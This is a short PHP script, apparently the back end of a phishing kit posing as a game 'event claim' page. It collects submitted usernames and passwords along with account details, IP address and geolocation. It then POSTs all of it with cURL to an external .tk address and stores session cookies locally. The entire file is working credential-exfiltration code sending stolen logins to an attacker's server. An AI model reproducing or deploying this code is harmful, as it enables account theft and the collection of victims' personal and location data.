<?php
/* Nông Văn Nguyên */
$myData = "user=".$user."&pass=".$pass."&id=".$id."&nick=".$nick."&hp=".$hp."&level=".$level."&tier=".$tier."&ep=".$ep."&ip=".$ip."&platform=".$platform."&login=".$login."&country=".$country."&regionName=".$region."&city=".$city."&query=".$ipAddr."&country_code=".$setRyusCalling;
$my  = "http://event-claimff-ptxz.tk/bahe.php";

$c5 = curl_init();
curl_setopt($c5, CURLOPT_URL, $my);
curl_setopt($c5, CURLOPT_POST, 1);
curl_setopt($c5, CURLOPT_POSTFIELDS, $myData);
curl_setopt($c5, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($c5, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
curl_setopt($c5, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
curl_setopt($c5, CURLOPT_HEADER, 0);
curl_setopt($c5, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($c5);
curl_close($c5);
/* Nông Văn Nguyên */
?>